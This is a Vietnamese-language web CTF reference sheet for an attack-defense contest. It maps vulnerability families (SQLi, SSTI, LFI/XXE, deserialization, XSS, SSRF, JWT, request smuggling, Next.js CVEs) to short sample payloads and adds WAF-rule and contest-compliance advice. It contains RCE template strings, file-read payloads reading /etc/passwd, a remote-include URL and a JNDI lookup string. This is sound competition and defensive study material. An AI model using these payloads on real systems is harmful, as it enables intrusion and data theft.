# Bản đồ lỗ hổng & kỹ thuật Web CTF — F-Hacker 2026 (Bảng C)

Nov 26, 2026 · @hung

> Tài liệu tra cứu offline mang vào phòng thi. Mục tiêu: liệt kê đầy đủ để lường trước mọi dạng challenge web. Mỗi mục là một đầu mối để bạn mở rộng thành bài giảng có payload mẫu.

## 0. Cách dùng & quy trình recon

Mỗi mục dưới đây là một *họ* lỗ hổng. Khi gặp challenge, bạn nhận diện họ trước (qua dấu hiệu), rồi lật đúng mục để lấy payload. Thứ thay đổi theo từng bài là payload; khung script gần như cố định.

**Quy trình khi nhận một service (làm theo thứ tự):**

1. Xem HTTP response: header `Server`, `X-Powered-By`, `Set-Cookie` (tên cookie lộ framework: `PHPSESSID`, `connect.sid` = Node/Express, `session` = Flask, `JSESSIONID` = Java, `laravel_session`).
2. Xem HTML source + file JS: comment, biến ẩn, endpoint API, tên tham số, version thư viện JS.
3. Liệt kê đường dẫn: `robots.txt`, `sitemap.xml`, `/.git/`, `/.env`, `/api`, `/admin`, swagger `/api-docs`, file backup (`.bak`, `~`, `.old`, `.swp`), `/debug`.
4. Thử gây lỗi: nhập ký tự lạ (`'`, `"`, `{{`, `<`, `../`, `\`) vào từng tham số, xem stack trace/thông báo lỗi lộ ngôn ngữ, đường dẫn, query.
5. Xác định ngôn ngữ/framework → quyết định hướng khai thác (PHP, Node, Python, Java, Ruby mỗi loại có trick riêng ở mục 11).

**Công cụ tải sẵn trước ngày thi (offline):** Burp Suite (proxy, Repeater, Intruder), `ffuf`/`gobuster` + wordlist SecLists, `sqlmap`, `nmap`, `nuclei` + templates, `jwt_tool`, `gittools` (dump .git), Python + thư viện `requests`, `pwntools`, `flask` (dựng listener), và bản PayloadsAllTheThings offline.

**Riêng F-Hacker (Attack-Defense):** mọi đội cùng một service, cùng lỗ hổng, không sửa được source. Việc cần làm nhanh: tìm lỗ hổng trên service của chính mình (có thể có source để đọc), viết exploit chạy lại được, rồi vừa tấn công đội khác vừa viết WAF rule chặn payload đó. Xem mục 14.

## 1. Injection phía server

**SQL Injection (SQLi)** — dấu hiệu: nhập `'` gây lỗi SQL, kết quả đổi theo input. Các biến thể:

1. **Union-based**: `' UNION SELECT ...` — rút dữ liệu khi kết quả hiện ra trang. Cần đếm số cột (`ORDER BY n`).
2. **Error-based**: ép DB trả lỗi chứa dữ liệu (`extractvalue`, `updatexml` trên MySQL).
3. **Boolean-blind**: so sánh `AND 1=1` vs `AND 1=2`, suy từng ký tự.
4. **Time-blind**: `SLEEP(5)`, `pg_sleep(5)`, `WAITFOR DELAY` — khi không có phản hồi nào khác.
5. **Stacked queries**: `; DROP ...` / `; INSERT ...` (phụ thuộc driver).
6. **Second-order**: payload lưu lại, kích hoạt ở request sau.
7. **WAF bypass**: comment `/**/`, đổi hoa thường, `UNION/**/SELECT`, encode, `char()`, `0x` hex.
   - Mọi DB khác cú pháp: MySQL, PostgreSQL, SQLite, MSSQL, Oracle — ghi chú riêng hàm lấy version/table/column cho từng loại.

**NoSQL Injection** (MongoDB...) — dấu hiệu: app dùng Mongo. Payload dạng toán tử: `{"$ne": null}`, `{"$gt": ""}`, `{"$regex": "^a"}` để bypass login hoặc blind từng ký tự; trong JSON body hoặc `user[$ne]=1` trên query string.

**OS Command Injection** — dấu hiệu: app gọi lệnh hệ thống (ping, convert, ffmpeg). Phân cách: `;`, `|`, `&&`, `$(...)`, `` `...` ``, newline `%0a`. Blind: dùng `sleep`, DNS/HTTP callback. Bypass lọc: `$IFS` thay space, nối chuỗi `c''at`, wildcard `/???/c?t`.

**Code Injection** — app `eval()` input: PHP `system()`, Python `__import__('os')`, Node `require('child_process')`. Xem mục 11 cho từng ngôn ngữ.

**Các injection khác:**

- **LDAP injection**: `*)(uid=*))(|(uid=*` — bypass auth trên LDAP.
- **XPath injection**: `' or '1'='1` trên truy vấn XML.
- **CRLF injection**: `%0d%0a` chèn header, làm split response, set cookie, poison.
- **Host header injection**: sửa `Host:` để đầu độc link reset mật khẩu, cache.
- **Email/SMTP header injection**, **log injection** (chèn log → log4shell-style).

## 2. Template Injection (SSTI) & Expression Language

**Dấu hiệu chung**: nhập `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>` — nếu trang trả về `49` là dính SSTI. Bước tiếp: xác định engine (payload dò `{{7*'7'}}` ra `7777777` là Jinja/Python, ra `49` là Twig/PHP), rồi leo lên RCE hoặc đọc file.

**Theo engine (ghi payload RCE riêng cho từng cái trong bài giảng):**

- **Jinja2 (Python/Flask)**: dùng `{{config}}`, `{{self}}`, chuỗi `{{''.__class__.__mro__[1].__subclasses__()}}` tìm `subprocess.Popen` hoặc `os._wrap_close` → RCE. Biến thể ngắn: `{{cycler.__init__.__globals__.os.popen('id').read()}}`, `{{lipsum.__globals__.os...}}`, `{{request.application...}}`.
- **Twig (PHP)**: `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}`; bản mới dùng `{{['id']|filter('system')}}`.
- **Freemarker (Java)**: `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}`.
- **Velocity (Java)**: dùng `$class.inspect(...).type` chuỗi gọi Runtime.
- **Smarty (PHP)**: `{system('id')}`, `{php}...{/php}`.
- **EJS / Handlebars / Pug / Nunjucks (Node)**: EJS qua option `outputFunctionName`; Handlebars/Pug có chuỗi prototype để ra RCE; Nunjucks `{{range.constructor(...)()}}`.
- **Mako (Python)**: `${__import__('os').popen('id').read()}`.
- **Thymeleaf (Java)**: `[[${T(java.lang.Runtime).getRuntime().exec('id')}]]` hoặc expression preprocessing `__${...}__`.

**Expression Language (EL) injection** (Java): `${...}` / `#{...}` trong Spring, JSF — `T(java.lang.Runtime).getRuntime().exec(...)`. Liên quan Spring: **SpEL injection**, **OGNL injection** (Struts2 — các CVE RCE nổi tiếng).

**Mẹo**: nếu chỉ đọc được biến mà chưa RCE, dò `config`/biến môi trường để lộ secret key → có thể dùng cho mục JWT/session (mục 9).

## 3. File & Path

**Path Traversal / LFI** — dấu hiệu: tham số trỏ tới file (`?page=`, `?file=`, `?lang=`, `download`). Payload:

- Cơ bản: `../../../../etc/passwd`, Windows `..\..\windows\win.ini`.
- Bypass lọc: `....//`, encode `%2e%2e%2f`, double-encode `%252e`, null byte `%00` (bản PHP cũ), tuyệt đối `/etc/passwd`.
- **PHP wrapper**: `php://filter/convert.base64-encode/resource=index.php` (đọc source), `php://filter/.../resource=...` chain, `data://text/plain;base64,...`, `expect://`, `zip://`, `phar://` (deserialization).
- **LFI → RCE**: log poisoning (chèn PHP vào User-Agent → include access.log), `/proc/self/environ`, session file, `/proc/self/fd`, email, upload tạm.

**RFI (Remote File Inclusion)**: `?page=http://attacker/shell.txt` — khi `allow_url_include=On`. Trong A/D không có Internet nên RFI ra ngoài thường vô dụng; nhưng include từ service nội bộ vẫn có thể.

**File Upload** — dấu hiệu: form upload ảnh/file. Các hướng:

- Upload webshell: `.php`, `.phtml`, `.php5`, `.phar`; bypass bằng đuôi kép `.php.jpg`, `.pHp`, null byte, magic byte ảnh + code, `.htaccess` để ép thực thi.
- Content-Type spoof, sửa magic header (GIF89a;).
- SVG/XML upload → XSS hoặc XXE.
- Path traversal trong tên file (`../../`) → ghi đè file.
- Zip-slip (giải nén chứa `../`), image parsing (ImageTragick, ffmpeg SSRF).

**XXE (XML External Entity)** — dấu hiệu: app nhận XML (SOAP, SVG, docx, config). Payload:

- Đọc file: `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`.
- Blind/OOB: entity trỏ tới DTD ngoài để exfil (cần listener nội bộ).
- Error-based lấy dữ liệu qua thông báo lỗi.
- XXE → SSRF (mục 7), billion laughs (DoS — cấm trong A/D).

## 4. Deserialization & Prototype Pollution

**Insecure Deserialization** — dấu hiệu: app nhận object serialize (cookie, token, field) rồi unserialize. Thường dẫn tới RCE qua *gadget chain*.

- **PHP** (`unserialize`): payload `O:4:"User":...`; khai thác magic method `__wakeup`, `__destruct`, `__toString`. Chuỗi POP gadget; công cụ **PHPGGC** (tải sẵn offline). Nhận biết qua chuỗi base64 bắt đầu `Tzo`/`YTo`. **Phar deserialization** qua `phar://`.
- **Python** (`pickle`): dấu hiệu base64 bắt đầu `gASV`/`gAJ`. Gadget `__reduce__` trả về `os.system`. Cẩn thận cả `yaml.load` (không safe), `jsonpickle`.
- **Java**: dấu hiệu base64 `rO0AB...` hoặc byte `ac ed 00 05`. Công cụ **ysoserial** (CommonsCollections, etc.). Cũng xem JNDI/LDAP (Log4Shell-style).
- **Node.js**: `node-serialize` (`_$$ND_FUNC$$_`), `funcster`.
- **Ruby**: Marshal, YAML (`!ruby/object`) — universal gadget.
- **.NET**: `BinaryFormatter`, `Json.NET` TypeNameHandling; công cụ **ysoserial.net**.

**Prototype Pollution (Node.js)** — dấu hiệu: app merge object người dùng (`_.merge`, `Object.assign` sâu, `req.body` vào config). Payload: `{"__proto__": {"isAdmin": true}}`, `{"constructor": {"prototype": {...}}}`, hoặc qua query `?__proto__[admin]=1`.

- Hậu quả: vượt quyền (thêm `isAdmin`), đổi thuộc tính để dẫn tới **RCE** (gây SSTI/command qua option bị poison như `NODE_OPTIONS`, `shell`), hoặc gây XSS phía client.
- Bản vá thường chỉ chặn `__proto__` — thử `constructor.prototype`, hoặc lỗi parse lồng nhau (ví dụ `flatnest`).

**Client-side Prototype Pollution**: pollution trên trình duyệt (qua URL params, JSON) → kết hợp gadget trong thư viện JS để ra DOM XSS. Hay đi cặp với CSP bypass và admin bot (mục 5).

## 5. XSS & Client-side

Rất phổ biến khi đề có **admin bot** (bot truy cập URL bạn gửi). Flag thường nằm trong cookie/trang của bot → exfil qua listener nội bộ.

**Các loại XSS:**

- **Reflected**: payload trong URL phản chiếu ngay ra trang.
- **Stored**: payload lưu lại (comment, profile, bio) → bot xem là dính.
- **DOM-based**: JS phía client xử lý `location`, `innerHTML`, `eval` không an toàn (sink: `document.write`, `innerHTML`, `setAttribute`).
- **mXSS (mutation)**: HTML bị biến đổi sau sanitize (bypass DOMPurify bản cũ).

**Payload cơ bản** và biến thể bypass: `<script>`, `<img src=x onerror=...>`, `<svg onload=...>`, `<iframe onload=...>`, event handler, `javascript:` URI, `<details open ontoggle>`. Khi bị lọc: đổi hoa thường, mã hóa HTML entity, Unicode, bỏ dấu ngoặc, dùng `${}`.

**Vượt qua phòng thủ phía client:**

- **CSP bypass**: tìm `script-src` lỏng (`unsafe-inline`, `unsafe-eval`, domain cho phép có JSONP/gadget), base-uri thiếu, `nonce` reuse, dùng `<base>`, upload file JS lên cùng origin.
- **DOM Clobbering**: dùng thẻ HTML (`<a id=x>`, `<form name=...>`) để ghi đè biến JS → kích hoạt sink; kết hợp HTML named entities.
- **Prototype pollution phía client** (mục 4) → gadget → XSS.
- **postMessage vulnerabilities**: handler `message` không kiểm tra `origin` → gửi payload từ iframe/popup.
- **XS-Leaks (cross-site leaks)**: suy thông tin qua kênh phụ (frame count, timing, `onerror`/`onload`, cache, ETag length). Dùng khi cần leak flag từng bít mà không đọc trực tiếp.
- **Cross-Site WebSocket Hijacking (CSWSH)**: WebSocket không chống CSRF.

**Exfil trong môi trường không Internet**: listener phải nằm trong mạng thi (laptop bạn chạy HTTP server, nếu bot truy cập được). Hỏi BTC xem bot có kết nối tới IP đội được không; nếu không, phải tìm cách lưu flag vào ngay service (ví dụ ghi vào một endpoint công khai rồi đọc lại).

## 6. CSRF, CORS, Clickjacking, Redirect

**CSRF (Cross-Site Request Forgery)** — dấu hiệu: hành động đổi trạng thái chỉ dựa vào cookie, không có token chống CSRF. Khai thác: trang HTML tự submit form tới nạn nhân; thường đi cặp admin bot. Bypass token yếu: token không kiểm tra, token dùng chung, bỏ token thì vẫn qua, đổi method, Content-Type `text/plain`.

**CORS misconfiguration** — dấu hiệu: header `Access-Control-Allow-Origin` phản chiếu origin + `Allow-Credentials: true`. Khai thác: trang của bạn gọi API nạn nhân, đọc được dữ liệu riêng. Kiểm tra cả null origin, subdomain, prefix/suffix matching lỏng.

**Clickjacking** — thiếu `X-Frame-Options`/`frame-ancestors`: nhúng trang nạn nhân vào iframe trong suốt, lừa click. Ít dùng trong CTF trừ khi có bot tương tác.

**Open Redirect** — `?url=`, `?next=`, `?redirect=` trỏ ra ngoài. Tự thân ít điểm, nhưng là mắt xích: bypass whitelist (`//evil.com`, `https:evil.com`, `@`, `\`, encode) để đưa bot đi, hoặc làm bước trong chuỗi SSRF/OAuth (leak token qua redirect\_uri).

**WebSocket**: CSWSH (đã nêu ở mục 5), thiếu xác thực origin trên kết nối, inject qua message.

**Request smuggling / desync liên quan client-side**: xem mục 10.

> Ghi chú A/D: CSRF/CORS/clickjacking chỉ ăn điểm khi có nạn nhân (admin bot) và bạn gửi được link cho bot. Nếu đề là service thuần API giữa các đội, nhóm này ít dùng; ưu tiên injection, access control, deserialization.

## 7. SSRF (Server-Side Request Forgery)

**Dấu hiệu**: app tự đi tải URL do bạn cung cấp (webhook, `?url=`, fetch ảnh, import từ link, PDF/screenshot generator, SVG). Rất mạnh trong môi trường nội bộ: để service gọi dịch vụ nội bộ mà bạn không tới trực tiếp được.

**Các dạng:**

- **Cơ bản**: `http://127.0.0.1:port/`, `http://localhost/admin`, dịch vụ nội bộ theo tên (`http://web:5000`, `http://redis:6379`).
- **Blind SSRF**: không thấy response — xác nhận qua timing hoặc callback nội bộ.
- **Cloud metadata**: `http://169.254.169.254/latest/meta-data/` (AWS), GCP/Azure endpoint — lấy credential (thường chỉ dùng ở CTF mô phỏng cloud).
- **Giao thức khác**: `gopher://` (gửi byte tùy ý → tấn công Redis/MySQL/SMTP nội bộ), `file://` (đọc file), `dict://`, `ftp://`.

**Bypass lọc SSRF:**

- Đổi biểu diễn IP: decimal `2130706433`, octal `0177.0.0.1`, hex `0x7f000001`, IPv6 `[::1]`, `[::ffff:127.0.0.1]`.
- DNS rebinding, domain trỏ về 127.0.0.1, `localtest.me`.
- Redirect: app chặn localhost nhưng theo redirect tới localhost.
- Parser differential trong URL (`http://expected@127.0.0.1`, `#`, `\`, khoảng trắng) — xu hướng mới 2024-2025.

**Chuỗi hay gặp**: SSRF → truy cập API nội bộ/admin → lấy flag; hoặc SSRF + gopher → RCE qua Redis. XXE cũng có thể dẫn tới SSRF (mục 3). SSRF qua Next.js middleware là dạng mới đáng ghi chú.

## 8. Access Control & Business Logic

Nhóm này **rất hay gặp trong A/D** vì không cần payload phức tạp, chỉ cần hiểu logic. Script thường chỉ là đổi tham số rồi lặp.

**IDOR / BOLA** — đổi ID để truy cập dữ liệu người khác: `/api/user/123` → `124`, `/order?id=`, UUID đoán được, ID mã hóa yếu. Trong A/D: flag thường ở record của user khác → duyệt qua ID.

**Broken Access Control** — truy cập endpoint cấm mà không kiểm quyền: gọi thẳng `/admin`, đổi method (GET→POST), thêm header (`X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`), path confusion (`/admin/`, `/Admin`, `//admin`, `/admin;foo`, `%2e`).

**Privilege Escalation** — nâng quyền user→admin: sửa role trong request/JWT/cookie, mass assignment (dưới), function-level access thiếu kiểm tra.

**Mass Assignment / Parameter Pollution** — gửi thêm field app không mong đợi: `{"username":"x","isAdmin":true}`, `role=admin`. HTTP Parameter Pollution: gửi trùng tham số (`?role=user&role=admin`) — server lấy cái nào?

**Business Logic Flaws** — lỗi quy trình: mua hàng giá âm, lặp lại thao tác được hưởng lợi, bỏ qua bước xác thực, đổi giá phía client, coupon dùng lại. Trong F-Hacker Store (mua bằng điểm ATK) chú ý logic này nếu Store có bug.

**Race Condition** — gửi nhiều request **cùng lúc** để lợi dụng khoảng thời gian kiểm tra–thực thi (TOCTOU): rút tiền/điểm 2 lần, dùng coupon nhiều lần, vượt giới hạn. Kỹ thuật: **single-packet attack** (HTTP/2) hoặc nhiều thread gửi đồng thời — đây là lúc cần script đa luồng (khung riêng).

> Mẹo A/D: khi có source, đọc hàm kiểm tra quyền và so sánh ID trước — lỗi access control thường lộ rõ trong code và dễ viết exploit lặp qua mọi ID.

## 9. Auth, Session & Crypto

**JWT attacks** — dấu hiệu: token 3 phần ngăn bởi dấu chấm (`eyJ...`). Kiểm tra:

- **alg: none** — đổi header `alg` thành `none`, bỏ chữ ký.
- **Key confusion RS256→HS256** — dùng public key làm HMAC secret ký lại.
- **Weak secret** — brute-force HMAC bằng wordlist (jwt\_tool, hashcat offline).
- **kid injection** — `kid` trỏ tới file/SQL (path traversal, SQLi trong kid).
- **jku/x5u** — trỏ tới JWKS do bạn kiểm soát (cần listener).
- Sửa claim: `admin:true`, `role`, `user_id`.

**Session/Cookie** — cookie đoán được, ký yếu, Flask session `eyJ...` ký bằng SECRET\_KEY (nếu leak secret qua SSTI/LFI → giả session, dùng `flask-unsign`). Session fixation, thiếu `HttpOnly`/`Secure`/`SameSite`.

**OAuth / OIDC flaws** — `redirect_uri` lỏng (lấy code/token), `state` thiếu (CSRF), implicit flow leak, mix-up, `response_type` nghịch, PKCE thiếu.

**SAML** — XML signature bypass (XSW — signature wrapping), comment injection trong NameID, kiính cẩn Ruby-SAML/XPath bypass.

**Crypto thường gặp trong web:**

- **Padding Oracle (CBC)** — server lộ lỗi padding → giải/tạo ciphertext (POODLE-style, `padbuster`).
- **ECB** — block giống nhau → cut-and-paste, byte-at-a-time (ECB oracle).
- **Hash length extension** — MAC dạng `hash(secret∥data)` → dùng `hashpump` thêm dữ liệu.
- **PHP type juggling** — `==` lỏng: `0e123==0e456` (magic hash), `strcmp` với array trả null, `md5` collision.
- **IV/nonce reuse**, **weak randomness** (predictable token từ time/seed), **JWT null signature**.

**2FA/OTP bypass** — OTP ngắn brute-force (chú ý giới hạn rate), response manipulation, reuse, bỏ qua bước. Password reset: token đoán được, host header poisoning (mục 1).

## 10. HTTP-level & Hạ tầng

Nhóm nâng cao, hay xuất hiện ở đề khó và trong Top 10 web hacking 2024-2025. Cần gửi request thô (socket) nên có khung script riêng.

**HTTP Request Smuggling / Desync** — proxy và backend hiểu ranh giới request khác nhau:

- **CL.TE / TE.CL / TE.TE** — mâu thuẫn giữa `Content-Length` và `Transfer-Encoding`.
- **TE.0 / CL.0** — biến thể mới 2024.
- **HTTP/2 desync**, **H2.CL/H2.TE** downgrade.
- Hậu quả: chiếm request người khác, bypass kiểm soát, poison cache.

**Web Cache Poisoning** — đầu độc cache bằng header không nằm trong cache key (unkeyed input): `X-Forwarded-Host`, `X-Forwarded-Scheme` → được lưu và phục vụ nạn nhân. Fat GET (GET có body) là biến thể mới.

**Web Cache Deception** — đánh lừa cache lưu trang nhạy cảm: `/account/profile.css`, path confusion giữa CDN và server (vụ ChatGPT ATO 2024). Nguyên nhân: parser URL khác nhau.

**Parser Differential** — xu hướng 2025: hai thành phần (WAF vs app, proxy vs backend, CDN vs origin) hiểu cùng input khác nhau → bypass. Ví dụ: URL parsing, host parsing (`parse_url` PHP), content-type, JSON interop.

**Unicode / Normalization** — **WorstFit** (Windows ANSI best-fit mapping), overlong UTF-8, normalization biến `．．／` thành `../`, case folding Unicode → bypass filter/WAF.

**Khác**: reverse proxy misconfig (`/..;/`), virtual host routing, HTTP/2 specific, CDN/origin trust, email parser confusion. Opossum attack, ETag length leak là các kỹ thuật mới đáng ghi chú.

## 11. Tricks theo công nghệ

Sau khi fingerprint ra ngôn ngữ/framework, lật mục tương ứng.

**PHP** — type juggling (`==`, magic hash `0e`), `strcmp`/`in_array` lỏng, wrapper (`php://`, `phar://`, `data://`), `extract()`/`$$var` variable overwrite, `assert()`, `preg_replace /e`, LFI→RCE, `unserialize` (mục 4), loose `is_numeric`, `parse_str`, upload `.htaccess`.

**Python / Flask** — SSTI Jinja2 (mục 2), `pickle` (mục 4), Flask debug console (Werkzeug PIN — tính được nếu leak đủ thông tin), `SECRET_KEY` leak → forge session, format string `str.format`/f-string injection, `eval`/`exec`, `subprocess shell=True`, YAML unsafe load, `os.path.join` với tuyệt đối.

**Node.js** — prototype pollution (mục 4), `child_process`, template engine (mục 2), `vm` escape, `require` trái phép, `__proto__` qua query parser (Express `qs`), NoSQL (mục 1), `JSON.parse` reviver, Happy-DOM/jsdom escape.

**Java** — deserialization (ysoserial), EL/SpEL/OGNL (mục 2), JNDI injection (Log4Shell `${jndi:ldap://}`), XXE, Spring actuator (`/actuator/env`, `/heapdump`), path traversal, EL trong error template.

**Ruby / Rails** — Marshal/YAML deserialization, mass assignment, `send`/`eval`, ERB SSTI, `Open3`/backtick, regex ReDoS, remote code qua `Oj`/`Psych`.

**GraphQL** — introspection bật (`__schema`) lộ toàn bộ API, batching/alias để brute-force vượt rate, injection qua resolver (SQLi/NoSQL bên dưới), IDOR qua query, field suggestion leak, deep query DoS.

**XML/SOAP** — XXE (mục 3), SAML (mục 9), XPath injection, XSLT injection.

**Công nghệ khác có thể gặp**: Golang (SSTI `text/template`, path), ASP.NET (ViewState deserialization, `__VIEWSTATE`), Redis/Memcached injection, server-side include (SSI) `<!--#exec-->`, LaTeX injection (đọc file), CSV/formula injection, Web3/Solidity (nếu có blockchain challenge: reentrancy, ABI trick, proxy).

## 12. Thu thập thông tin & Recon

Thường là bước đầu, đôi khi là cả lời giải (lộ source hoặc flag trực tiếp).

**Lộ mã nguồn / bí mật:**

- `.git/` lộ → dump toàn bộ source (git-dumper, gittools). Rất hay gặp.
- `.env`, `config.php.bak`, `settings.py`, `.svn/`, `.hg/`, `.DS_Store`.
- File backup: `index.php~`, `.bak`, `.old`, `.swp` (vim), `.save`, `app.zip`, `backup.tar.gz`.
- Source map `.js.map` lộ code frontend.

**Endpoint & cấu hình lộ:**

- `robots.txt`, `sitemap.xml`, `/api-docs`, swagger/openapi, `.well-known`.
- Debug: Flask/Django debug page, `phpinfo()`, Spring actuator, `/debug`, stack trace.
- Directory listing bật, header lộ version.

**Kỹ thuật dò:**

- Fuzzing thư mục/file bằng ffuf + wordlist (SecLists `raft`, `common.txt`).
- **HTTP verb tampering**: thử PUT, DELETE, PATCH, TRACE, method lạ.
- Parameter mining (dò tham số ẩn bằng Arjun/wordlist).
- So sánh response để phát hiện endpoint ẩn.

**Information disclosure khác**: error verbose lộ path/query, timing, response length khác nhau (user enumeration), comment HTML, metadata file (EXIF, PDF author), `/proc` qua LFI.

> A/D: nếu BTC cấp source service (hoặc dump được qua `.git`), đọc source là ưu tiên số 1 — tìm đúng lỗ hổng công khai, viết exploit nhanh, và biết chính xác payload nào cần chặn bằng WAF (mục 13).

## 13. WAF — bị bypass & viết rule phòng thủ

Trong F-Hacker bạn vừa phải **vượt WAF đội khác** vừa **viết WAF rule** bảo vệ chính mình (ModSecurity-style, UI riêng).

**Kỹ thuật bypass WAF (khi tấn công):**

- Mã hóa: URL-encode, double-encode, Unicode, HTML entity, base64 (nếu app decode), mixed case.
- Chia nhỏ/chèn: comment `/**/`, `+`, null byte, khoảng trắng lạ (`\t`, `\n`, `$IFS`, `%0c`).
- Đổi cú pháp tương đương: SQLi dùng `||`, hàm thay thế, JSON thay form, thay `OR` bằng toán tử.
- Parser differential (mục 10): WAF và app hiểu request khác nhau — Content-Type lạ, charset, multipart trôi, HTTP method.
- Chuyển vị trí payload: body thay vì URL, header, cookie, param pollution.
- Thay đại diện IP/host (mục 7, 10).

**Viết WAF rule (khi phòng thủ)** — lưu ý quy chế:

- **Chặn theo payload tấn công, không chặn theo IP** (cấm). Không deny all, không chặn API phục vụ cờ.
- Viết regex khớp đúng chuỗi khai thác (ví dụ `UNION.*SELECT`, `__proto__`, `../`, `{{`, `<script`) nhưng **tránh chặn request bình thường** (bị trừ SVC nặng, gấp đôi nếu chặn nhầm API có bug).
- Bật DetectionOnly trước để xem log, test rule không chặn nhầm, rồi mới chuyển sang block.
- Rule nhẹ (CPU/RAM giới hạn) — tránh regex thảm họa (catastrophic backtracking) làm WAF chậm, mất SVC.
- Giữ rule qua các round (quy chế cho phép), nên chuẩn bị sẵn bộ rule mẫu cho từng lỗ hổng để dán nhanh.

**Chuẩn bị trước**: luyện tại repo BTC `github.com/f-hacker-macos/2026-waf-practice` (`make up`, app qua WAF cổng 8000, UI WAF cổng 8005). Tạo sẵn thu viện regex rule theo từng nhóm lỗ hổng ở trên.

## 14. Riêng Attack-Defense: tự động hóa & checklist

Đây là phần quyết định điểm trong F-Hacker. Lỗ hổng giống nhau cho mọi đội; thắng thua ở việc khai thác ổn định và phòng thủ tốt.

**Script exploit cần tái sử dụng** (viết 1 lần, chạy mọi đội, mọi round):

- Nhận host/IP đội mục tiêu làm tham số, lặp qua danh sách đội.
- Khai thác → trích flag bằng regex `FHACKER2026\{[0-9a-f]{64}\}`.
- Đầu mỗi round service reset + flag mới → script phải chạy lại được, không phụ thuộc trạng thái cũ.
- Ghi flag ra file, để script nộp riêng đọc.

**Script nộp flag chung** — **giới hạn 30 lần/phút** (vượt bị 429 và vi phạm Điều 6): thêm delay/throttle, không nộp brute-force, khử trùng flag đã nộp.

**Nguyên tắc tuân thủ (tránh mất điểm/loại):**

- Chỉ lấy flag, **không phá service** đội khác sau khi khai thác (Điều 6.1.f).
- Không DoS, không tấn công hạ tầng BTC/bot/UI WAF đội khác.
- Không tấn công trước giờ/sau giờ; không chia sẻ exploit/flag.
- Giữ service sống cho bot healthcheck (mỗi 30s): đừng để WAF chặn nhầm request bình thường.

**Checklist mỗi round (làm nhanh):**

1. Service vừa reset — lấy flag mới: chạy toàn bộ exploit sẵn có lên các đội.
2. Nộp flag thu được (qua script throttle).
3. Kiểm tra DEF/SVC của mình; WAF rule có chặn nhầm không (xem traffic log).
4. Nếu lỗ hổng mới xuất hiện (Level 2 từ round 4) — đọc source, viết exploit + rule.
5. Cân nhắc Store (mua bằng điểm ATK) nếu có món hữu ích.

**Checklist dò lỗ hổng khi gặp service lạ** (duyệt nhanh nhóm 1-12): input → thử `'` `"` `{{` `<` `../` `;` `$()` `__proto__`; xem cookie/JWT; thử đổi ID (IDOR); xem `.git`/backup; thử upload; xem có admin bot không (→ XSS); xem có fetch URL không (→ SSRF); xem có deserialize không.

> Để viết bài giảng: với mỗi nhóm lỗ hổng ở trên, thêm (a) 1-2 payload mẫu đầy đủ, (b) khung script `requests` tương ứng, (c) 1 regex WAF rule chặn. Khi nào bạn sẵn sàng, mình giúp dựng bộ khung script + payload mẫu cho từng mục.

## 15. CVE theo framework & kỹ thuật chuyên sâu (từ writeup 2024-2026)

Bổ sung sau khi khảo sát writeup các giải gần đây (SekaiCTF, HITCON, Google CTF, Intigriti, 0xL4ugh, SECCON, DownUnder, HTB). Xu hướng rõ: **nhận ra framework + version → tra CVE công khai → dùng PoC**. Phải tải sẵn PoC/exploit offline.

**PHP — LFI → RCE ("php2shell"):**

- **PHP filter chain to RCE** — dùng `php://filter` xếp tầng `convert.iconv.*` để tạo byte tùy ý, biến LFI thành RCE **không cần upload file**. Công cụ: `php_filter_chain_generator` (Synacktiv) — tải sẵn.
- **PHP exit() bypass** — `php://filter/write=convert.base64-decode/resource=...` ghi shell dù có `exit()` chặn.
- **CVE-2024-2961** — lỗi glibc iconv (`ISO-2022-CN-EXT`), biến **arbitrary file read → RCE** (công cụ CNEXT). Rất hay ra gần đây.
- **Phar deserialization**, **nginx/php-fpm path bypass**.

**Next.js / React ("react2shell"):**

- **CVE-2025-55182 (React2Shell)** — RSC (React Server Components) "Flight" deserialization quên check `hasOwnProperty` → duyệt prototype tới `Function` constructor → **RCE unauth** (CVSS 10). Dấu hiệu: Next.js 15/16 + React 19, POST kèm header `Next-Action`, response `text/x-component`.
- **CVE-2025-29927** — **Next.js middleware auth bypass** bằng header `x-middleware-subrequest`. Bypass trang admin.
- **CVE-2024-34351 / CVE-2025-57822** — **SSRF qua Next.js** (Server Actions / middleware / Image component). Dùng `nip.io`/domain trỏ 127.0.0.1 tới flag server nội bộ.
- Grep chunk JS `/_next/static/chunks/` để đọc logic frontend.

**Node / JS nâng cao:**

- **Server-side JS injection**, **vm escape** (sandbox `vm`), **happy-dom / jsdom escape**, prototype pollution → RCE qua option bị poison (0xL4ugh v5).

**Kỹ thuật khác xuất hiện trong writeup:**

- **POP chain qua CMS** (WordPress core `__toString` → LFI/RCE — Sekai "Fancy").
- **Redis / Unix socket injection → RCE** (ghi byte qua SSRF gopher hoặc socket).
- **Polyglot file** (file vừa hợp lệ nhiều định dạng → bypass filter — 0CTF "ezmd").
- **MIME / Content-Type confusion** + path traversal (SECCON "dummyhole").
- **Template engine mới**: Typst injection (CPCTF "Typst Note").
- **Client-side nặng** (Google CTF): XS-Leaks biến thể, CSS injection, quirks mode, postMessage, iframe/sandbox escape, "sourceless" XSS.
- **Cache poisoning + reflected XSS + Redis/SQLite** chuỗi (BSides Algiers "LibraryVault").

**Nguyên tắc vàng từ các writeup**: *"Khi bí, nhìn vào dependencies, rồi nhìn source."* Luôn kiểm tra `package.json`/`composer.json`/version header — phiên bản cố định duy nhất thường chính là lỗ hổng.

## 16. Khảo sát tần suất thực tế (phương pháp & kết quả) — cập nhật 27/11/2026

**Phương pháp (đã thay thế mẫu 35 writeup cũ):**

- Thử đếm tag trên listing CTFtime → **thất bại**: \~95% challenge web chỉ gắn tag chung, không có tag kỹ thuật.
- Thay vào đó: dùng `survey_web_ctf.py`/`survey_web_ctf_v2.py` quét **toàn bộ repo `sajjadium/ctf-archives`**
  bằng partial clone + sparse-checkout (chỉ tải thư mục `web/`, ~7GB thay vì ~40GB cả repo) →
  quét được **1253 challenge web thật / 194 giải**, so với mẫu 35 writeup đọc tay trước đây.
- Tách riêng 35 giải dễ/sinh viên (TJCTF, HSCTF, UMDCTF, BYUCTF, UTCTF...) và 28 giải khó/elite
  (DiceCTF, HITCON, idekCTF, GoogleCTF, SekaiCTF...) để so sánh thay vì gộp chung.
